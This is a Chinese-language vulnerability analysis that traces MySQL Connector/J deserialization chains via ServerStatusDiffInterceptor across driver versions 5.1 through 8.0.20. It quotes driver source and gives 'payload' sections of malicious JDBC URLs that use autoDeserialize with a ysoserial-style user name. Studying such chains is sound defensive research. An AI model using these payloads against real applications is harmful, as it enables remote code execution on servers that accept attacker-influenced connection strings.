`String url = "jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections4_calc";
String username = "yso_CommonsCollections4_calc";
String password = "";
Class.forName("com.mysql.jdbc.Driver");
conn = DriverManager.getConnection(url,username,password);
String sql = "select database()";
PreparedStatement ps = conn.prepareStatement(sql);
//执行查询操作，返回的是数据库结果集的数据表
ResultSet resultSet = ps.executeQuery();` 

调用DriverManager.getConnection(url);  
java.sql.DriverManager#getConnection()方法

`@CallerSensitive
    public static Connection getConnection(String url)
        throws SQLException {

        java.util.Properties info = new java.util.Properties();
        return (getConnection(url, info, Reflection.getCallerClass()));
    }` 

调用至此类getConnection()方法

`//  Worker method called by the public getConnection() methods.
private static Connection getConnection(
    String url, java.util.Properties info, Class<?> caller) throws SQLException {
    ...
    // Walk through the loaded registeredDrivers attempting to make a connection.
    // Remember the first exception that gets raised so we can reraise it.
    SQLException reason = null;

    for(DriverInfo aDriver : registeredDrivers) {
        // If the caller does not have permission to load the driver then
        // skip it.
        if(isDriverAllowed(aDriver.driver, callerCL)) {
            try {
                println("    trying " + aDriver.driver.getClass().getName());
                //调用至com.mysql.jdbc.NonRegisteringDriver#connect()方法
                Connection con = aDriver.driver.connect(url, info);
                if (con != null) {
                    // Success!
                    println("getConnection returning " + aDriver.driver.getClass().getName());
                    return (con);
                }
            } catch (SQLException ex) {
                if (reason == null) {
                    reason = ex;
                }
            }
    ...
}` 

com.mysql.jdbc.NonRegisteringDriver#connect()方法

 `public java.sql.Connection connect(String url, Properties info) throws SQLException {
        //url为数据库连接url，不为空进入
        if (url != null) {
            //url以jdbc:mysql:mxj:// 开头进入
            if (StringUtils.startsWithIgnoreCase(url, LOADBALANCE_URL_PREFIX)) {
                return connectLoadBalanced(url, info);
                ////url以jdbc:mysql:loadbalance:// 开头进入
            } else if (StringUtils.startsWithIgnoreCase(url, REPLICATION_URL_PREFIX)) {
                return connectReplicationConnection(url, info);
            }
        }

        Properties props = null;

        if ((props = parseURL(url, info)) == null) {
            return null;
        }

        if (!"1".equals(props.getProperty(NUM_HOSTS_PROPERTY_KEY))) {
            return connectFailover(url, info);
        }

        try {
            //进入
            Connection newConn = com.mysql.jdbc.ConnectionImpl.getInstance(host(props), port(props), props, database(props), url);

            return newConn;
        ...
    }` 

com.mysql.jdbc.ConnectionImpl#getInstance()方法

`protected static Connection getInstance(String hostToConnectTo, int portToConnectTo, Properties info, String databaseToConnectTo, String url)
    throws SQLException {
    if (!Util.isJdbc4()) {
        return new ConnectionImpl(hostToConnectTo, portToConnectTo, info, databaseToConnectTo, url);
    }

    return (Connection) Util.handleNewInstance(JDBC_4_CONNECTION_CTOR, new Object[] { hostToConnectTo, Integer.valueOf(portToConnectTo), info,
                                                                                     databaseToConnectTo, url }, null);
}` 

com.mysql.jdbc.Util#handleNewInstance()方法

`public static final Object handleNewInstance(Constructor<?> ctor, Object[] args, ExceptionInterceptor exceptionInterceptor) throws SQLException {
    try {
        //此次ctor为com.mysql.jdbc.JDBC4Connection
        return ctor.newInstance(args);
    } catch (IllegalArgumentException e) {
    ...
}` 

调用至com.mysql.jdbc.JDBC4Connection构造方法

`public JDBC4Connection(String hostToConnectTo, int portToConnectTo, Properties info, String databaseToConnectTo, String url) throws SQLException {
    //调用父类构造方法  JDBC4Connection extends ConnectionImpl
    super(hostToConnectTo, portToConnectTo, info, databaseToConnectTo, url);
}` 

### [5.1.0-5.1.10](#toc_510-5110)

调用至com.mysql.jdbc.ConnectionImpl构造方法（mysql-connector-java 5.1.10）

`public ConnectionImpl(String hostToConnectTo, int portToConnectTo, Properties info, String databaseToConnectTo, String url) throws SQLException {
    ...
    try {
        this.dbmd = this.getMetaData(false, false);
        this.createNewIO(false);
        this.initializeStatementInterceptors();
        this.io.setStatementInterceptors(this.statementInterceptors);
    } catch (SQLException ex) {
    cleanup(ex);
    ...
}` 

调用至com.mysql.jdbc.ConnectionImpl#initializeStatementInterceptors()方法（mysql-connector-java 5.1.10），此方法解析连接参数中statementInterceptors参数并添加相应类至当前对象statementInterceptors属性

`protected void initializeStatementInterceptors() throws SQLException {
    this.statementInterceptors = Util.loadExtensions(this, this.props, this.getStatementInterceptors(), "MysqlIo.BadStatementInterceptor", this.getExceptionInterceptor());
}` 

初始化完成后执行查询PreparedStatement ps = conn.prepareStatement(sql);，执行完成后获取结果，执行java.sql.PreparedStatement#executeQuery()方法

`public ResultSet executeQuery() throws SQLException {
        ...
        if (locallyScopedConn.useMaxRows()) {
            if (this.hasLimitClause) {
                this.results = this.executeInternal(this.maxRows, sendPacket, this.createStreamingResultSet(), true, metadataFromCache, false);
            } else {
                if (this.maxRows <= 0) {
                    this.executeSimpleNonQuery(locallyScopedConn, "SET OPTION SQL_SELECT_LIMIT=DEFAULT");
                } else {
                    this.executeSimpleNonQuery(locallyScopedConn, "SET OPTION SQL_SELECT_LIMIT=" + this.maxRows);
                }

                this.results = this.executeInternal(-1, sendPacket, doStreaming, true, metadataFromCache, false);
                if (oldCatalog != null) {
                    this.connection.setCatalog(oldCatalog);
                }
            }
        ...
}` 

调用至java.sql.PreparedStatement#executeInternal()方法

`protected ResultSetInternalMethods executeInternal(int maxRowsToRetrieve, Buffer sendPacket, boolean createStreamingResultSet, boolean queryIsSelectOnly, Field[] metadataFromCache, boolean isBatch) throws SQLException {
    try {
        this.resetCancelledState();
        ConnectionImpl locallyScopedConnection = this.connection;
        ++this.numberOfExecutions;
        if (this.doPingInstead) {
            this.doPingInstead();
            return this.results;
        } else {
            StatementImpl.CancelTask timeoutTask = null;

            ResultSetInternalMethods rs;
            try {
                if (locallyScopedConnection.getEnableQueryTimeouts() && this.timeoutInMillis != 0 && locallyScopedConnection.versionMeetsMinimum(5, 0, 0)) {
                    timeoutTask = new StatementImpl.CancelTask(this, this);
                    ConnectionImpl.getCancelTimer().schedule(timeoutTask, (long)this.timeoutInMillis);
                }

                rs = locallyScopedConnection.execSQL(this, (String)null, maxRowsToRetrieve, sendPacket, this.resultSetType, this.resultSetConcurrency, createStreamingResultSet, this.currentCatalog, metadataFromCache, isBatch);
                if (timeoutTask != null) {
                    timeoutTask.cancel();
                    if (timeoutTask.caughtWhileCancelling != null) {
                        throw timeoutTask.caughtWhileCancelling;
                    }

                    timeoutTask = null;
                }
                ...` 

调用至com.mysql.jdbc.ConnectionImpl#execSQL()方法

`ResultSetInternalMethods execSQL(StatementImpl callingStatement, String sql, int maxRows, Buffer packet, int resultSetType, int resultSetConcurrency, boolean streamResults, String catalog, Field[] cachedMetadata, boolean isBatch) throws SQLException {
        ...
        ResultSetInternalMethods var43;
        try {
            if (packet != null) {
                ResultSetInternalMethods var44 = this.io.sqlQueryDirect(callingStatement, (String)null, (String)null, packet, maxRows, resultSetType, resultSetConcurrency, streamResults, catalog, cachedMetadata);
                return var44;
            }

            encoding = null;
            if (this.getUseUnicode()) {
                encoding = this.getEncoding();
            }

            var43 = this.io.sqlQueryDirect(callingStatement, sql, encoding, (Buffer)null, maxRows, resultSetType, resultSetConcurrency, streamResults, catalog, cachedMetadata);
            ...` 

调用至com.mysql.jdbc.ConnectionImpl#sqlQueryDirect()方法

`final ResultSetInternalMethods sqlQueryDirect(StatementImpl callingStatement, String query, String characterEncoding, Buffer queryPacket, int maxRows, int resultSetType, int resultSetConcurrency, boolean streamResults, String catalog, Field[] cachedMetadata) throws Exception {
    ++this.statementExecutionDepth;

    try {
        if (this.statementInterceptors != null) {
            ResultSetInternalMethods interceptedResults = this.invokeStatementInterceptorsPre(query, callingStatement);
            if (interceptedResults != null) {
                ResultSetInternalMethods var12 = interceptedResults;
                return var12;
            }
        }` 

调用至com.mysql.jdbc.ConnectionImpl#invokeStatementInterceptorsPre()方法

`private ResultSetInternalMethods invokeStatementInterceptorsPre(String sql, com.mysql.jdbc.Statement interceptedStatement) throws SQLException {
    ResultSetInternalMethods previousResultSet = null;
    Iterator interceptors = this.statementInterceptors.iterator();

    while(interceptors.hasNext()) {
        StatementInterceptor interceptor = (StatementInterceptor)interceptors.next();
        boolean executeTopLevelOnly = interceptor.executeTopLevelOnly();
        boolean shouldExecute = executeTopLevelOnly && this.statementExecutionDepth == 1 || !executeTopLevelOnly;
        if (shouldExecute) {
            String sqlToInterceptor = sql;
            if (interceptedStatement instanceof PreparedStatement) {
                sqlToInterceptor = ((PreparedStatement)interceptedStatement).asSql();
            }

            ResultSetInternalMethods interceptedResultSet = interceptor.preProcess(sqlToInterceptor, interceptedStatement, this.connection);
            if (interceptedResultSet != null) {
                previousResultSet = interceptedResultSet;
            }
        }
    }

    return previousResultSet;
}` 

调用至com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor#preProcess()方法

`public ResultSetInternalMethods preProcess(String sql, Statement interceptedStatement, Connection connection) throws SQLException {
    if (connection.versionMeetsMinimum(5, 0, 2)) {
        this.populateMapWithSessionStatusValues(connection, this.preExecuteValues);
    }

    return null;
}` 

调用至com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor#populateMapWithSessionStatusValues()方法

`private void populateMapWithSessionStatusValues(Connection connection, Map toPopulate) throws SQLException {
    java.sql.Statement stmt = null;
    ResultSet rs = null;

    try {
        toPopulate.clear();
        stmt = connection.createStatement();
        rs = stmt.executeQuery("SHOW SESSION STATUS");
        Util.resultSetToMap(toPopulate, rs);
    } finally {
        if (rs != null) {
            rs.close();
        }

        if (stmt != null) {
            stmt.close();
        }

    }

}` 

调用至com.mysql.jdbc.Util.resultSetToMap(),至此调用链与detectCustomCollations链中com.mysql.jdbc.Util.resultSetToMap()一致，最后调用至getObject()方法，最后进行反序列化。

#### [payload](#toc_payload_4)

`String url = "jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections4_calc";
String username = "yso_CommonsCollections4_calc";
String password = "";
Class.forName("com.mysql.jdbc.Driver");
conn = DriverManager.getConnection(url,username,password);
String sql = "select database()";
PreparedStatement ps = conn.prepareStatement(sql);
//执行查询操作，返回的是数据库结果集的数据表
ResultSet resultSet = ps.executeQuery();` 

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/51be2066-3ce9-4928-88ed-8705712a416e.png?raw=true)
](https://storage.tttang.com/media/attachment/2022/12/30/9869a88f-8c7c-4203-9a1d-0406d57fd91b.png)

### [5.1.11-5.x.xx](#toc_5111-5xxx)

调用至com.mysql.jdbc.ConnectionImpl构造方法（mysql-connector-java 5.1.18）

`public ConnectionImpl(String hostToConnectTo, int portToConnectTo, Properties info, String databaseToConnectTo, String url) throws SQLException {
    ...
    try {
    this.dbmd = getMetaData(false, false);
    调用initializeSafeStatementInterceptors()方法
    initializeSafeStatementInterceptors();
    //调用至createNewIO()方法
    createNewIO(false);
    unSafeStatementInterceptors();
    } catch (SQLException ex) {
    cleanup(ex);
    ...
}` 

调用至com.mysql.jdbc.ConnectionImpl#initializeSafeStatementInterceptors()方法（mysql-connector-java 5.1.18），此方法解析连接参数中statementInterceptors参数并添加相应类至当前对象statementInterceptors属性

`public void initializeSafeStatementInterceptors() throws SQLException {
    this.isClosed = falcse;
    //此次声明unwrappedInterceptors为数据库连接url中statementInterceptors连接参数即com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor
    List unwrappedInterceptors = Util.loadExtensions(this, this.props, this.getStatementInterceptors(), "MysqlIo.BadStatementInterceptor", this.getExceptionInterceptor());
    this.statementInterceptors = new ArrayList(unwrappedInterceptors.size());
    //遍历unwrappedInterceptors
    for(int i = 0; i < unwrappedInterceptors.size(); ++i) {
        //interceptor为ServerStatusDiffInterceptor
        Object interceptor = unwrappedInterceptors.get(i);
        //目标类实现StatementInterceptor此处为true进入if，
        if (interceptor instanceof StatementInterceptor) {
            //此处为空进入else
            if (ReflectiveStatementInterceptorAdapter.getV2PostProcessMethod(interceptor.getClass()) != null) {
                this.statementInterceptors.add(new NoSubInterceptorWrapper(new ReflectiveStatementInterceptorAdapter((StatementInterceptor)interceptor)));
            } else {
                //进行添加，添加V1toV2StatementInterceptorAdapter((StatementInterceptor)interceptor))
                this.statementInterceptors.add(new NoSubInterceptorWrapper(new V1toV2StatementInterceptorAdapter((StatementInterceptor)interceptor)));
            }
        } else {
            this.statementInterceptors.add(new NoSubInterceptorWrapper((StatementInterceptorV2)interceptor));
        }
    }
}` 

调用至com.mysql.jdbc.ConnectionImpl#createNewIO()方法（mysql-connector-java 5.1.18）

`public synchronized void createNewIO(boolean isForReconnect) throws SQLException {
    Properties mergedProps = this.exposeAsProperties(this.props);
    if (!this.getHighAvailability()) {
        //调用connectOneTryOnly()
        this.connectOneTryOnly(isForReconnect, mergedProps);
    } else {
        this.connectWithRetries(isForReconnect, mergedProps);
    }
}` 

调用至com.mysql.jdbc.ConnectionImpl#connectOneTryOnly()方法（mysql-connector-java 5.1.18）

`private void connectOneTryOnly(boolean isForReconnect, Properties mergedProps) throws SQLException {
    Exception connectionNotEstablishedBecause = null;

    try {
        this.coreConnect(mergedProps);
        this.connectionId = this.io.getThreadId();
        this.isClosed = false;
        boolean oldAutoCommit = this.getAutoCommit();
        int oldIsolationLevel = this.isolationLevel;
        boolean oldReadOnly = this.isReadOnly();
        String oldCatalog = this.getCatalog();
        this.io.setStatementInterceptors(this.statementInterceptors);
        //调用initializePropsFromServer()
        this.initializePropsFromServer();
        if (isForReconnect) {
            this.setAutoCommit(oldAutoCommit);
            if (this.hasIsolationLevels) {
                this.setTransactionIsolation(oldIsolationLevel);
            }

            this.setCatalog(oldCatalog);
            this.setReadOnly(oldReadOnly);
        }

    } catch (Exception var8) {
        if (this.io != null) {
            this.io.forceClose();
        }

        if (var8 instanceof SQLException) {
            throw (SQLException)var8;
        } else {
            SQLException chainedEx = SQLError.createSQLException(Messages.getString("Connection.UnableToConnect"), "08001", this.getExceptionInterceptor());
            chainedEx.initCause(var8);
            throw chainedEx;
        }
    }
}` 

调用至com.mysql.jdbc.ConnectionImpl#initializePropsFromServer()方法（mysql-connector-java 5.1.18）

`private void initializePropsFromServer() throws SQLException {
    String connectionInterceptorClasses = this.getConnectionLifecycleInterceptors();
    this.connectionLifecycleInterceptors = null;
    if (connectionInterceptorClasses != null) {
        this.connectionLifecycleInterceptors = Util.loadExtensions(this, this.props, connectionInterceptorClasses, "Connection.badLifecycleInterceptor", this.getExceptionInterceptor());
    }

    this.setSessionVariables();
    if (!this.versionMeetsMinimum(4, 1, 0)) {
        this.setTransformedBitIsBoolean(false);
    }

    this.parserKnowsUnicode = this.versionMeetsMinimum(4, 1, 0);
    if (this.getUseServerPreparedStmts() && this.versionMeetsMinimum(4, 1, 0)) {
        this.useServerPreparedStmts = true;
        if (this.versionMeetsMinimum(5, 0, 0) && !this.versionMeetsMinimum(5, 0, 3)) {
            this.useServerPreparedStmts = false;
        }
    }

    String sqlModeAsString;
    if (this.versionMeetsMinimum(3, 21, 22)) {
        //调用至loadServerVariables()
        this.loadServerVariables();
        ...` 

调用至com.mysql.jdbc.ConnectionImpl#loadServerVariables()方法（mysql-connector-java 5.1.18）

`private void loadServerVariables() throws SQLException {
    ...
    Statement stmt = null;
    ResultSet results = null;

    try {
        stmt = this.getMetadataSafeStatement();
        String version = this.dbmd.getDriverVersion();
        if (version != null && version.indexOf(42) != -1) {
            StringBuffer buf = new StringBuffer(version.length() + 10);

            for(int i = 0; i < version.length(); ++i) {
                char c = version.charAt(i);
                if (c == '*') {
                    buf.append("[star]");
                } else {
                    buf.append(c);
                }
            }

            version = buf.toString();
        }

        String versionComment = !this.getParanoid() && version != null ? "/* " + version + " */" : "";
        String query = versionComment + "SHOW VARIABLES";
        if (this.versionMeetsMinimum(5, 0, 3)) {
            query = versionComment + "SHOW VARIABLES WHERE Variable_name ='language'" + " OR Variable_name = 'net_write_timeout'" + " OR Variable_name = 'interactive_timeout'" + " OR Variable_name = 'wait_timeout'" + " OR Variable_name = 'character_set_client'" + " OR Variable_name = 'character_set_connection'" + " OR Variable_name = 'character_set'" + " OR Variable_name = 'character_set_server'" + " OR Variable_name = 'tx_isolation'" + " OR Variable_name = 'transaction_isolation'" + " OR Variable_name = 'character_set_results'" + " OR Variable_name = 'timezone'" + " OR Variable_name = 'time_zone'" + " OR Variable_name = 'system_time_zone'" + " OR Variable_name = 'lower_case_table_names'" + " OR Variable_name = 'max_allowed_packet'" + " OR Variable_name = 'net_buffer_length'" + " OR Variable_name = 'sql_mode'" + " OR Variable_name = 'query_cache_type'" + " OR Variable_name = 'query_cache_size'" + " OR Variable_name = 'init_connect'";
        }

        this.serverVariables = new HashMap();
        //调用至com.mysql.jdbc.StatementImpl#executeQuery()
        results = stmt.executeQuery(query);
        ...` 

调用至com.mysql.jdbc.StatementImpl#executeQuery()方法

`public synchronized ResultSet executeQuery(String sql) throws SQLException {
    this.checkClosed();
    MySQLConnection locallyScopedConn = this.connection;
    synchronized(locallyScopedConn) {
        this.retrieveGeneratedKeys = false;
        this.resetCancelledState();
        this.checkNullOrEmptyQuery(sql);
        boolean doStreaming = this.createStreamingResultSet();
        ...
        if (sql.charAt(0) == '/' && sql.startsWith("/* ping */")) {
            this.doPingInstead();
            return this.results;
        } else {
            this.checkForDml(sql, firstStatementChar);
            if (this.results != null && !locallyScopedConn.getHoldResultsOpenOverStatementClose()) {
                this.results.realClose(false);
            }

            CachedResultSetMetaData cachedMetaData = null;
            if (this.useServerFetch()) {
                this.results = this.createResultSetUsingServerFetch(sql);
                return this.results;
            } else {
                CancelTask timeoutTask = null;
                String oldCatalog = null;

                try {
                    ...
                    if (locallyScopedConn.useMaxRows()) {
                        if (StringUtils.indexOfIgnoreCase(sql, "LIMIT") != -1) {

                            this.results = locallyScopedConn.execSQL(this, sql, this.maxRows, (Buffer)null, this.resultSetType, this.resultSetConcurrency, doStreaming, this.currentCatalog, cachedFields);
                            .....` 

调用至com.mysql.jdbc.ConnectionImpl#execSQL()方法（mysql-connector-java 5.1.18）

`public synchronized ResultSetInternalMethods execSQL(StatementImpl callingStatement, String sql, int maxRows, Buffer packet, int resultSetType, int resultSetConcurrency, boolean streamResults, String catalog, Field[] cachedMetadata, boolean isBatch) throws SQLException {
    ...
    ResultSetInternalMethods var31;
    try {
        if (packet != null) {
            ResultSetInternalMethods var32 = this.io.sqlQueryDirect(callingStatement, (String)null, (String)null, packet, maxRows, resultSetType, resultSetConcurrency, streamResults, catalog, cachedMetadata);
            return var32;
        }

        String encoding = null;
        if (this.getUseUnicode()) {
            encoding = this.getEncoding();
        }

        var31 = this.io.sqlQueryDirect(callingStatement, sql, encoding, (Buffer)null, maxRows, resultSetType, resultSetConcurrency, streamResults, catalog, cachedMetadata);
        ...` 

调用至com.mysql.jdbc.ConnectionImpl#sqlQueryDirect()方法（mysql-connector-java 5.1.18）

`final ResultSetInternalMethods sqlQueryDirect(StatementImpl callingStatement, String query, String characterEncoding, Buffer queryPacket, int maxRows, int resultSetType, int resultSetConcurrency, boolean streamResults, String catalog, Field[] cachedMetadata) throws Exception {
    ++this.statementExecutionDepth;

    Object var50;
    try {
        if (this.statementInterceptors != null) {
            //
            ResultSetInternalMethods interceptedResults = this.invokeStatementInterceptorsPre(query, callingStatement, false);
            if (interceptedResults != null) {
                ResultSetInternalMethods var12 = interceptedResults;
                return var12;
            }
        }` 

调用至com.mysql.jdbc.ConnectionImpl#invokeStatementInterceptorsPre()方法（mysql-connector-java 5.1.18）

`ResultSetInternalMethods invokeStatementInterceptorsPre(String sql, com.mysql.jdbc.Statement interceptedStatement, boolean forceExecute) throws SQLException {
    ResultSetInternalMethods previousResultSet = null;
    //interceptors为ServerStatusDiffInterceptor
    Iterator interceptors = this.statementInterceptors.iterator();

    while(interceptors.hasNext()) {
        StatementInterceptorV2 interceptor = (StatementInterceptorV2)interceptors.next();
        boolean executeTopLevelOnly = interceptor.executeTopLevelOnly();
        boolean shouldExecute = executeTopLevelOnly && (this.statementExecutionDepth == 1 || forceExecute) || !executeTopLevelOnly;
        if (shouldExecute) {
            ResultSetInternalMethods interceptedResultSet = interceptor.preProcess(sql, interceptedStatement, this.connection);
            if (interceptedResultSet != null) {
                previousResultSet = interceptedResultSet;
            }
        }
    }

    return previousResultSet;
}` 

此处栈如下：  
[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/64312480-837b-4999-8eca-f92f19700cca.png?raw=true)
](https://storage.tttang.com/media/attachment/2022/12/30/cd6e0f71-dbda-42bd-9946-1d8ec51b9fc7.png)  
调用至com.mysql.jdbc.NoSubInterceptorWrapper#preProcess()

`public ResultSetInternalMethods preProcess(String sql, Statement interceptedStatement, Connection connection) throws SQLException {
    this.underlyingInterceptor.preProcess(sql, interceptedStatement, connection);
    return null;
}` 

调用至com.mysql.jdbc.V1toV2StatementInterceptorAdapter#preProcess()

`public ResultSetInternalMethods preProcess(String sql, Statement interceptedStatement, Connection connection) throws SQLException {
    //此处this.toProxy为ServerStatusDiffInterceptor
    return this.toProxy.preProcess(sql, interceptedStatement, connection);
}` 

调用至com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor#preProcess()

`public ResultSetInternalMethods preProcess(String sql, Statement interceptedStatement, Connection connection) throws SQLException {
    if (connection.versionMeetsMinimum(5, 0, 2)) {
        this.populateMapWithSessionStatusValues(connection, this.preExecuteValues);
    }

    return null;
}` 

调用至com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor#populateMapWithSessionStatusValues()

`private void populateMapWithSessionStatusValues(Connection connection, Map toPopulate) throws SQLException {
    java.sql.Statement stmt = null;
    ResultSet rs = null;

    try {
        toPopulate.clear();
        stmt = connection.createStatement();
        rs = stmt.executeQuery("SHOW SESSION STATUS");
        Util.resultSetToMap(toPopulate, rs);
    } finally {
        if (rs != null) {
            rs.close();
        }

        if (stmt != null) {
            stmt.close();
        }

    }

}` 

调用至com.mysql.jdbc.Util.resultSetToMap(),至此调用链与detectCustomCollations链中com.mysql.jdbc.Util.resultSetToMap()一致，最后调用至getObject()方法，最后进行反序列化。

#### [payload](#toc_payload_5)

`String url = "jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections4_calc";
String username = "yso_CommonsCollections4_calc";
String password = "";
Class.forName("com.mysql.jdbc.Driver");
conn = DriverManager.getConnection(url,username,password);` 

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/a5155763-0e54-4993-8e7f-982d26fb9ad6.png?raw=true)
](https://storage.tttang.com/media/attachment/2022/12/30/0cd9d2e6-7236-49e5-9eec-3acadd5e2416.png)

### [6.x](#toc_6x)

mysql-connector-java 6.x此利用链与上述5.1.11-5.x.xx完全相同，仅因更改jdbc包，由com.mysql.jdbc改为com.mysql.cj.jdbc。  
栈调用详情如下：  
[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/3afe42ee-111d-44ef-ae35-3092a58126ee.png?raw=true)
](https://storage.tttang.com/media/attachment/2022/12/30/c4a6f4e1-50c5-4781-a306-a746737b49e9.png)

#### [payload](#toc_payload_6)

`String url = "jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections4_calc";
String username = "yso_CommonsCollections4_calc";
String password = "";
Class.forName("com.mysql.jdbc.Driver");
conn = DriverManager.getConnection(url,username,password);` 

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/254d5d46-47de-44d5-8957-d62edfbb4760.png?raw=true)
](https://storage.tttang.com/media/attachment/2022/12/30/91af16a9-e35a-478c-bc0f-0d2ce9637362.png)

### [8.0.7-8.0.20](#toc_807-8020)

调用至com.mysql.cj.jdbc.ConnectionImpl构造方法（mysql-connector-java 8.0.7-dmr）

`public ConnectionImpl(HostInfo hostInfo) throws SQLException {
    try {
        this.origHostInfo = hostInfo;
        this.origHostToConnectTo = hostInfo.getHost();
        this.origPortToConnectTo = hostInfo.getPort();
        this.nullStatementResultSetFactory = new ResultSetFactory(this, (StatementImpl)null);
        this.session = new MysqlaSession(hostInfo, this.getPropertySet());
        this.session.addListener(this);
        this.autoReconnectForPools = this.getPropertySet().getBooleanReadableProperty("autoReconnectForPools");
        this.cachePrepStmts = this.getPropertySet().getBooleanReadableProperty("cachePrepStmts");
        this.autoReconnect = this.getPropertySet().getModifiableProperty("autoReconnect");
        this.profileSQL = this.getPropertySet().getModifiableProperty("profileSQL");
        this.useUsageAdvisor = this.getPropertySet().getBooleanReadableProperty("useUsageAdvisor");
        this.reconnectAtTxEnd = this.getPropertySet().getBooleanReadableProperty("reconnectAtTxEnd");
        this.emulateUnsupportedPstmts = this.getPropertySet().getBooleanReadableProperty("emulateUnsupportedPstmts");
        this.ignoreNonTxTables = this.getPropertySet().getBooleanReadableProperty("ignoreNonTxTables");
        this.pedantic = this.getPropertySet().getBooleanReadableProperty("pedantic");
        this.prepStmtCacheSqlLimit = this.getPropertySet().getIntegerReadableProperty("prepStmtCacheSqlLimit");
        this.useLocalSessionState = this.getPropertySet().getBooleanReadableProperty("useLocalSessionState");
        this.useServerPrepStmts = this.getPropertySet().getBooleanReadableProperty("useServerPrepStmts");
        this.processEscapeCodesForPrepStmts = this.getPropertySet().getBooleanReadableProperty("processEscapeCodesForPrepStmts");
        this.useLocalTransactionState = this.getPropertySet().getBooleanReadableProperty("useLocalTransactionState");
        this.maxAllowedPacket = this.getPropertySet().getModifiableProperty("maxAllowedPacket");
        this.disconnectOnExpiredPasswords = this.getPropertySet().getBooleanReadableProperty("disconnectOnExpiredPasswords");
        this.readOnlyPropagatesToServer = this.getPropertySet().getBooleanReadableProperty("readOnlyPropagatesToServer");
        this.database = hostInfo.getDatabase();
        this.user = StringUtils.isNullOrEmpty(hostInfo.getUser()) ? "" : hostInfo.getUser();
        this.password = StringUtils.isNullOrEmpty(hostInfo.getPassword()) ? "" : hostInfo.getPassword();
        this.props = hostInfo.exposeAsProperties();
        this.initializeDriverProperties(this.props);
        this.pointOfOrigin = (Boolean)this.useUsageAdvisor.getValue() ? LogUtils.findCallingClassAndMethod(new Throwable()) : "";
        this.dbmd = this.getMetaData(false, false);
        //解析queryInterceptors连接参数并加载至当前类属性
        this.initializeSafeQueryInterceptors();
    } catch (CJException var3) {
        throw SQLExceptionsMapping.translateException(var3, this.getExceptionInterceptor());
    }

    try {
        /
        this.createNewIO(false);
    ...` 

调用至com.mysql.cj.jdbc.ConnectionImpl#initializeSafeQueryInterceptors()

`public void initializeSafeQueryInterceptors() throws SQLException {
    try {
        this.queryInterceptors = (List)Util.loadClasses(this.getPropertySet().getStringReadableProperty("queryInterceptors").getStringValue(), "MysqlIo.BadQueryInterceptor", this.getExceptionInterceptor()).stream().map((o) -> {
            return new NoSubInterceptorWrapper(o.init(this, this.props, this.session.getLog()));
        }).collect(Collectors.toList());
    } catch (CJException var2) {
        throw SQLExceptionsMapping.translateException(var2, this.getExceptionInterceptor());
    }
}` 

继续调用至com.mysql.cj.jdbc.ConnectionImpl#createNewIO()

`public void createNewIO(boolean isForReconnect) {
    try {
        synchronized(this.getConnectionMutex()) {
            try {
                Properties mergedProps = this.getPropertySet().exposeAsProperties(this.props);
                if (!(Boolean)this.autoReconnect.getValue()) {
                    this.connectOneTryOnly(isForReconnect, mergedProps);
                    return;
                }

                this.connectWithRetries(isForReconnect, mergedProps);
            } catch (SQLException var6) {
                throw (UnableToConnectException)ExceptionFactory.createException(UnableToConnectException.class, var6.getMessage(), var6);
            }

        }
    } catch (CJException var8) {
        throw SQLExceptionsMapping.translateException(var8, this.getExceptionInterceptor());
    }
}` 

调用至com.mysql.cj.jdbc.ConnectionImpl#connectOneTryOnly()

`private void connectOneTryOnly(boolean isForReconnect, Properties mergedProps) throws SQLException {
    Exception connectionNotEstablishedBecause = null;
    try {
        JdbcConnection c = this.getProxy();
        this.session.connect(this.origHostInfo, mergedProps, this.user, this.password, this.database, DriverManager.getLoginTimeout() * 1000, c);
        boolean oldAutoCommit = this.getAutoCommit();
        int oldIsolationLevel = this.isolationLevel;
        boolean oldReadOnly = this.isReadOnly(false);
        String oldCatalog = this.getCatalog();
        this.session.setQueryInterceptors(this.queryInterceptors);
        this.initializePropsFromServer();
        ...` 

调用至com.mysql.cj.jdbc.ConnectionImpl#initializePropsFromServer()

`private void initializePropsFromServer() throws SQLException {
    ...
    this.session.configureClientCharacterSet(false);
    this.handleAutoCommitDefaults();
    this.session.getServerSession().configureCharacterSets();
    ((com.mysql.cj.jdbc.DatabaseMetaData)this.dbmd).setMetadataEncoding(this.getSession().getServerSession().getCharacterSetMetadata());
    ((com.mysql.cj.jdbc.DatabaseMetaData)this.dbmd).setMetadataCollationIndex(this.getSession().getServerSession().getMetadataCollationIndex());
    this.setupServerForTruncationChecks();
}` 

调用至com.mysql.cj.jdbc.ConnectionImpl#handleAutoCommitDefaults()

`private void handleAutoCommitDefaults() throws SQLException {
    try {
        boolean resetAutoCommitDefault = false;
        String initConnectValue = this.session.getServerVariable("init_connect");
        if (initConnectValue != null && initConnectValue.length() > 0) {
            String s = this.session.queryServerVariable("@@session.autocommit");
            if (s != null) {
                this.session.setAutoCommit(Boolean.parseBoolean(s));
                if (!this.session.isAutoCommit()) {
                    resetAutoCommitDefault = true;
                }
            }
        } else {
            resetAutoCommitDefault = true;
        }

        if (resetAutoCommitDefault) {
            try {
                this.setAutoCommit(true);
            } catch (SQLException var5) {
                if (var5.getErrorCode() != 1820 || (Boolean)this.disconnectOnExpiredPasswords.getValue()) {
                    throw var5;
                }
            }
        }

    } catch (CJException var6) {
        throw SQLExceptionsMapping.translateException(var6, this.getExceptionInterceptor());
    }
}` 

